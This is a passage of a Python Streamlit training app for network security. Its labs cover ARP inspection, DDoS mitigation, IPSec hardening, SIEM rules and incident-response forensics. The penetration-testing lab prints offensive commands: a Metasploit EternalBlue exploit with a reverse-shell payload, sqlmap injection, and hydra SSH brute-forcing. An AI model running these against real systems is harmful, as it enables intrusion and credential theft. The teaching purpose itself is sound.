        "Gratuitous ARP": "Unsolicited ARP replies to update victim's cache"
    }
    
    st.warning(f"⚠️ **{attack}:** {attack_info[attack]}")
    
    # Dynamic ARP Inspection
    st.markdown("### 🛡️ **Dynamic ARP Inspection (DAI)**")
    
    st.code("""
    ! Enable DAI on VLANs
    ip arp inspection vlan 10,20,30
    
    ! Configure trusted interfaces
    interface GigabitEthernet0/24
     ip arp inspection trust
    
    ! Configure rate limiting
    interface range GigabitEthernet0/1-23
     ip arp inspection limit rate 15
    
    ! Additional validations
    ip arp inspection validate src-mac
    ip arp inspection validate dst-mac
    ip arp inspection validate ip
    
    ! Verification
    show ip arp inspection
    show ip arp inspection statistics
    """, language="text")
    
    # IP Source Guard
    st.markdown("### 🔒 **IP Source Guard**")
    
    st.code("""
    ! Requires DHCP Snooping
    interface GigabitEthernet0/1
     ip verify source
     ip verify source port-security
    
    ! Static IP binding
    ip source binding 00AA.00BB.00CC vlan 10 192.168.1.100 interface Gi0/1
    
    ! Verification
    show ip verify source
    show ip source binding
    """, language="text")

def ddos_protection_lab():
    """DDoS Protection Strategies"""
    
    st.markdown(create_lab_header("DDoS Protection Lab", "🚫", "linear-gradient(90deg, #FA8BFF 0%, #2BD2FF 50%, #2BFF88 100%)"), unsafe_allow_html=True)
    
    # Theory Section
    with st.expander("📖 **DDoS Protection Theory**", expanded=True):
        st.markdown("""
        ### 🚫 **Understanding DDoS Protection**
        
        Distributed Denial of Service (DDoS) attacks overwhelm systems with traffic from multiple sources, 
        requiring sophisticated detection and mitigation strategies to maintain service availability.
        
        **DDoS Attack Categories:**
        
        1. **Volume-Based (Layer 3-4)**
           - UDP floods
           - ICMP floods
           - DNS amplification
           - NTP amplification
           - Measured in Gbps/Tbps
        
        2. **Protocol Attacks (Layer 3-4)**
           - SYN floods
           - ACK floods
           - Fragmented packet attacks
           - Smurf attacks
           - Measured in packets per second
        
        3. **Application Layer (Layer 7)**
           - HTTP floods
           - Slowloris
           - DNS query floods
           - WordPress XML-RPC
           - Measured in requests per second
        
        **Attack Characteristics:**
        
        | Type | Volume | Complexity | Detection | Mitigation |
        |------|--------|------------|-----------|------------|
        | Volume | Very High | Low | Easy | Rate limiting |
        | Protocol | High | Medium | Medium | SYN cookies |
        | Application | Low | High | Hard | WAF, Behavioral |
        
        **Detection Methods:**
        - **Traffic Anomaly** - Baseline deviation
        - **Rate-Based** - Threshold exceeded
        - **Signature-Based** - Known patterns
        - **Behavioral** - ML/AI analysis
        - **Flow Analysis** - NetFlow/sFlow
        
        **Mitigation Strategies:**
        
        1. **Network Level**
           - Rate limiting
           - Black hole routing
           - Scrubbing centers
           - Anycast distribution
           - BGP Flowspec
        
        2. **Protocol Level**
           - SYN cookies
           - Connection limits
           - TCP reset
           - IP spoofing prevention
        
        3. **Application Level**
           - CAPTCHA challenges
           - JavaScript validation
           - Rate limiting per user
           - Geo-blocking
        
        **DDoS Protection Services:**
        - **CloudFlare** - Global anycast network
        - **Akamai** - Prolexic platform
        - **AWS Shield** - Automatic protection
        - **Azure DDoS** - Adaptive tuning
        - **Imperva** - Application focus
        
        **Amplification Factors:**
        - DNS: 28-54x
        - NTP: 556x
        - SSDP: 30x
        - CharGEN: 358x
        - Memcached: 51,000x
        
        **Best Practices:**
        - Implement rate limiting
        - Deploy DDoS protection service
        - Create incident response plan
        - Regular DDoS drills
        - Monitor traffic patterns
        - Maintain contact with ISP
        - Configure firewalls properly
        - Keep systems updated
        """)
    
    # DDoS Attack Types
    st.markdown("### 💥 **DDoS Attack Types**")
    
    attack_type = st.selectbox("Attack Type:", ["SYN Flood", "UDP Flood", "ICMP Flood", "HTTP Flood", "Amplification"])
    
    if attack_type == "SYN Flood":
        st.code("""
        ! SYN Flood Protection - TCP Intercept
        ip tcp intercept list 100
        ip tcp intercept mode intercept
        ip tcp intercept max-incomplete high 500
        ip tcp intercept max-incomplete low 400
        ip tcp intercept one-minute high 500
        ip tcp intercept one-minute low 400
        ip tcp intercept drop-mode oldest
        
        access-list 100 permit tcp any any
        """, language="text")
    
    elif attack_type == "UDP Flood":
        st.code("""
        ! Rate Limiting UDP Traffic
        class-map match-any UDP-TRAFFIC
         match protocol udp
        
        policy-map RATE-LIMIT-UDP
         class UDP-TRAFFIC
          police 1000000 conform-action transmit exceed-action drop
        
        interface GigabitEthernet0/0
         service-policy input RATE-LIMIT-UDP
        """, language="text")
    
    elif attack_type == "ICMP Flood":
        st.code("""
        ! ICMP Rate Limiting
        ip icmp rate-limit unreachable 10
        
        ! CAR (Committed Access Rate)
        interface GigabitEthernet0/0
         rate-limit input access-group 101 1000000 187500 375000 conform-action transmit exceed-action drop
        
        access-list 101 permit icmp any any
        """, language="text")
    
    # Mitigation Techniques
    st.markdown("### 🛡️ **Mitigation Techniques**")
    
    technique = st.selectbox("Mitigation:", ["Rate Limiting", "Black Hole", "Scrubbing", "CDN", "Anycast"])
    
    if technique == "Black Hole":
        st.code("""
        ! Remotely Triggered Black Hole (RTBH)
        
        ! Trigger Router
        ip route 192.0.2.1 255.255.255.255 Null0 tag 666
        router bgp 65001
         redistribute static route-map RTBH
        
        route-map RTBH permit 10
         match tag 666
         set community 65001:666
         set origin igp
        
        ! Edge Router
        ip community-list 1 permit 65001:666
        route-map BLACKHOLE permit 10
         match community 1
         set ip next-hop 192.0.2.1
        """, language="text")

def vpn_security_lab():
    """VPN Security Best Practices"""
    
    st.markdown(create_lab_header("VPN Security Lab", "🔒", "linear-gradient(90deg, #00C9FF 0%, #92FE9D 100%)"), unsafe_allow_html=True)
    
    # VPN Security Checklist
    st.markdown("### ✅ **VPN Security Checklist**")
    
    checklist = [
        "Use strong encryption (AES-256)",
        "Implement Perfect Forward Secrecy (PFS)",
        "Use certificate-based authentication",
        "Enable Dead Peer Detection (DPD)",
        "Implement split tunneling carefully",
        "Regular key rotation",
        "Monitor VPN logs",
        "Use 2FA for VPN access"
    ]
    
    for item in checklist:
        checked = st.checkbox(item, key=f"vpn_{item}")
        if checked:
            st.success(f"✓ {item}")
    
    # IPSec Best Practices
    st.markdown("### 🔐 **IPSec Best Practices**")
    
    st.code("""
    ! Strong IPSec Configuration
    
    ! IKEv2 Proposal
    crypto ikev2 proposal STRONG-PROPOSAL
     encryption aes-cbc-256 aes-gcm-256
     integrity sha512 sha384
     group 19 20 21
    
    ! IKEv2 Policy
    crypto ikev2 policy STRONG-POLICY
     proposal STRONG-PROPOSAL
    
    ! IPSec Transform Set
    crypto ipsec transform-set AES256-SHA512 esp-aes 256 esp-sha512-hmac
     mode tunnel
    
    ! IPSec Profile with PFS
    crypto ipsec profile IPSEC-PROFILE
     set transform-set AES256-SHA512
     set pfs group19
     set security-association lifetime seconds 3600
     set security-association replay window-size 512
    
    ! Dead Peer Detection
    crypto ikev2 profile IKEv2-PROFILE
     dpd 10 3 periodic
    """, language="text")

def siem_lab():
    """Security Information and Event Management"""
    
    st.markdown(create_lab_header("SIEM Lab", "📊", "linear-gradient(90deg, #FC466B 0%, #3F5EFB 100%)"), unsafe_allow_html=True)
    
    # Log Sources
    st.markdown("### 📝 **Log Sources Configuration**")
    
    log_source = st.selectbox("Log Source:", ["Firewall", "IDS/IPS", "Switch", "Router", "Windows", "Linux"])
    
    if log_source == "Firewall":
        st.code("""
        ! Cisco ASA Syslog Configuration
        logging enable
        logging timestamp
        logging buffer-size 1000000
        logging buffered informational
        logging host inside 192.168.1.100
        logging trap informational
        
        ! Log specific events
        logging message 106015 level debugging
        logging message 106023 level debugging
        """, language="text")
    
    elif log_source == "Linux":
        st.code("""
        # /etc/rsyslog.conf
        
        # Forward all logs to SIEM
        *.* @@192.168.1.100:514
        
        # Forward auth logs
        auth,authpriv.* @@192.168.1.100:514
        
        # Forward kernel logs
        kern.* @@192.168.1.100:514
        
        # Restart rsyslog
        systemctl restart rsyslog
        """, language="bash")
    
    # Correlation Rules
    st.markdown("### 🔗 **Correlation Rules**")
    
    rule_type = st.selectbox("Rule Type:", ["Brute Force", "Data Exfiltration", "Privilege Escalation", "Malware"])
    
    if rule_type == "Brute Force":
        st.code("""
        Rule: Detect Brute Force Attack
        
        Conditions:
        - Event Type: Authentication Failure
        - Count: > 5
        - Time Window: 5 minutes
        - Group By: Source IP, Destination User
        
        Actions:
        - Generate Alert (High Priority)
        - Block Source IP
        - Notify Security Team
        
        Query:
        event_type="authentication_failure" 
        | stats count by src_ip, user 
        | where count > 5
        | eval risk_score=count*10
        """, language="text")
    
    # Dashboard Metrics
    st.markdown("### 📊 **Security Dashboard**")
    
    # Simulate metrics
    col1, col2, col3, col4 = st.columns(4)
    
    with col1:
        st.metric("Events/Hour", f"{random.randint(10000, 50000):,}")
    
    with col2:
        st.metric("Critical Alerts", random.randint(0, 5))
    
    with col3:
        st.metric("Failed Logins", random.randint(50, 200))
    
    with col4:
        st.metric("Blocked IPs", random.randint(10, 50))

def penetration_testing_lab():
    """Penetration Testing Methodology"""
    
    st.markdown(create_lab_header("Penetration Testing Lab", "🕵️", "linear-gradient(90deg, #f093fb 0%, #f5576c 100%)"), unsafe_allow_html=True)
    
    # Pentest Phases
    st.markdown("### 📋 **Penetration Testing Phases**")
    
    phase = st.selectbox("Phase:", ["Reconnaissance", "Scanning", "Exploitation", "Post-Exploitation", "Reporting"])
    
    if phase == "Reconnaissance":
        st.markdown("#### **1️⃣ Reconnaissance**")
        
        recon_type = st.radio("Type:", ["Passive", "Active"])
        
        if recon_type == "Passive":
            st.code("""
            # OSINT Gathering
            
            # DNS Reconnaissance
            host -t ns example.com
            host -t mx example.com
            
            # Whois Information
            whois example.com
            
            # Google Dorking
            site:example.com filetype:pdf
            site:example.com inurl:admin
            
            # Shodan Search
            hostname:example.com
            org:"Example Company"
            
            # Certificate Transparency
            https://crt.sh/?q=%.example.com
            """, language="bash")
        else:
            st.code("""
            # Active Reconnaissance
            
            # DNS Enumeration
            dnsrecon -d example.com
            dnsenum example.com
            
            # Subdomain Enumeration
            gobuster dns -d example.com -w wordlist.txt
            
            # Directory Enumeration
            gobuster dir -u http://example.com -w /usr/share/wordlists/dirb/common.txt
            
            # Technology Detection
            whatweb example.com
            wafw00f example.com
            """, language="bash")
    
    elif phase == "Scanning":
        st.markdown("#### **2️⃣ Scanning**")
        
        st.code("""
        # Network Scanning
        
        # Host Discovery
        nmap -sn 192.168.1.0/24
        
        # Port Scanning
        nmap -sS -sV -O -A 192.168.1.100
        nmap -p- --min-rate=1000 192.168.1.100
        
        # UDP Scanning
        nmap -sU --top-ports 100 192.168.1.100
        
        # Vulnerability Scanning
        nmap --script vuln 192.168.1.100
        
        # Service Enumeration
        enum4linux 192.168.1.100
        smbclient -L //192.168.1.100
        """, language="bash")
    
    elif phase == "Exploitation":
        st.markdown("#### **3️⃣ Exploitation**")
        
        st.warning("⚠️ **Legal Warning:** Only test on systems you own or have permission to test!")
        
        st.code("""
        # Metasploit Framework
        
        msfconsole
        
        # Search for exploits
        search type:exploit platform:windows smb
        
        # Use exploit
        use exploit/windows/smb/ms17_010_eternalblue
        set RHOSTS 192.168.1.100
        set PAYLOAD windows/x64/meterpreter/reverse_tcp
        set LHOST 192.168.1.10
        exploit
        
        # Manual Exploitation
        # SQL Injection
        sqlmap -u "http://example.com/page?id=1" --dbs
        
        # Password Attacks
        hydra -l admin -P passwords.txt ssh://192.168.1.100
        """, language="bash")

def incident_response_lab():
    """Incident Response Procedures"""
    
    st.markdown(create_lab_header("Incident Response Lab", "🚨", "linear-gradient(90deg, #FA8BFF 0%, #2BD2FF 50%, #2BFF88 100%)"), unsafe_allow_html=True)
    
    # Incident Response Phases
    st.markdown("### 📋 **NIST Incident Response Lifecycle**")
    
    phases = {
        "1. Preparation": "Establish IR team, tools, procedures",
        "2. Detection & Analysis": "Identify and validate incidents",
        "3. Containment": "Limit damage and prevent spread",
        "4. Eradication": "Remove threat from environment",
        "5. Recovery": "Restore systems to normal",
        "6. Lessons Learned": "Document and improve process"
    }
    
    selected_phase = st.selectbox("Select Phase:", list(phases.keys()))
    st.info(phases[selected_phase])
    
    # Incident Checklist
    st.markdown("### ✅ **Initial Response Checklist**")
    
    checklist_items = [
        "Document everything (time, actions, observations)",
        "Isolate affected systems",
        "Preserve evidence (memory, logs, disk)",
        "Identify attack vector",
        "Determine scope of compromise",
        "Notify stakeholders",
        "Engage legal/law enforcement if needed",
        "Begin containment procedures"
    ]
    
    for item in checklist_items:
        st.checkbox(item, key=f"ir_{item}")
    
    # Forensic Commands
    st.markdown("### 🔍 **Forensic Data Collection**")
    
    os_type = st.selectbox("System Type:", ["Windows", "Linux"])
    
    if os_type == "Windows":
        st.code("""
        REM Windows Forensics Commands
        
        REM Network connections
        netstat -anob > netstat.txt
        
        REM Running processes
        tasklist /v > processes.txt
        wmic process list full > wmic_processes.txt
        
        REM System information
        systeminfo > systeminfo.txt
        
        REM User accounts
        net user > users.txt
        net localgroup administrators > admins.txt
        
        REM Scheduled tasks
        schtasks /query /fo LIST /v > scheduled_tasks.txt
        
        REM Registry autorun
        reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
        
        REM Event logs
        wevtutil epl System system.evtx
        wevtutil epl Security security.evtx
        """, language="batch")
    else:
        st.code("""
        # Linux Forensics Commands
        
        # System information
        uname -a > system_info.txt
        cat /etc/os-release >> system_info.txt
        
        # Network connections
        netstat -tulpan > netstat.txt
        ss -tulpan > ss.txt
        
        # Running processes
        ps auxww > processes.txt
        lsof -n > open_files.txt
        
        # User information
        cat /etc/passwd > users.txt
        last > last_logins.txt
        w > current_users.txt
        
        # Cron jobs
        crontab -l > user_cron.txt
        cat /etc/crontab > system_cron.txt
        
        # Logs
        tar czf logs.tar.gz /var/log/
        
        # Memory dump (requires LiME)
        insmod lime.ko "path=/tmp/memory.lime format=lime"
        """, language="bash")
    
    # Incident Report Template
    st.markdown("### 📄 **Incident Report Template**")
    
    if st.button("Generate Report Template", key="gen_report"):
        report = f"""
        # INCIDENT REPORT
        
        **Report ID:** INC-{datetime.now().strftime('%Y%m%d-%H%M')}
        **Date:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
        
        ## Executive Summary
        [Brief description of incident and impact]
        
        ## Incident Details
        - **Detection Time:** 
        - **Response Time:**
        - **Resolution Time:**
        - **Severity:** Critical/High/Medium/Low
        - **Type:** Malware/Breach/DoS/Other
        
        ## Affected Systems
        - System 1: [IP/Hostname]
        - System 2: [IP/Hostname]
        
        ## Timeline of Events
        1. [Time] - Initial detection
        2. [Time] - Response initiated
        3. [Time] - Containment completed
        
        ## Root Cause Analysis
        [Description of how the incident occurred]
        
        ## Remediation Actions
        - [ ] Action 1
        - [ ] Action 2
        
        ## Lessons Learned
        - Finding 1
        - Finding 2
        
        ## Recommendations
        - Recommendation 1
        - Recommendation 2
        """
        
        st.code(report, language="markdown")

if __name__ == "__main__":
    run_lab()
